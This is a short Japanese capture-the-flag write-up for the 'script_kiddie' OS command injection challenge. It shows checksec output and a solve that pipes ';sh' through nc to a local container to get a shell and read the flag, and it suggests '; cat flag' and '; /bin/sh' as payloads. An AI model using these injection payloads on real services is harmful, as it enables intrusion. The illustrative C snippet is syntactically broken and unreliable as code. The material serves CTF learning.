## 事前知識
### OSコマンドインジェクション
外部からの攻撃により、OSコマンドを不正に実行されてしまう問題のこと。

例えば、下記のようなプログラムがあったときに、`; sh`という入力をすると、シェルが立ち上がってしまいます。

```c
int main() {
    char input[16];
    scanf("%s", char);
    system("echo " + char);
}
```

### checksec

```bash
$ checksec script_kiddie
[*] '/home/user/work/taskctf21-public/pwn/script_kiddie/dist/script_kiddie'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## 方針
- OSコマンドインジェクションをやる

## 解法
サーバの起動

```bash
docker-compose up -d
```

```bash
(echo ";sh"; cat) | nc 127.0.0.1 30005
Which flag do you want?
ls
flag
script_kiddie
start.sh
cat flag
taskctf{n0w_y0u_g0t_shell}
^C
```

## コメント
OSコマンドインジェクションの問題です。一番シンプルなのは「; cat flag」でしょうか？「; /bin/sh」もアリです。気づけば比較的なんでも通ります。
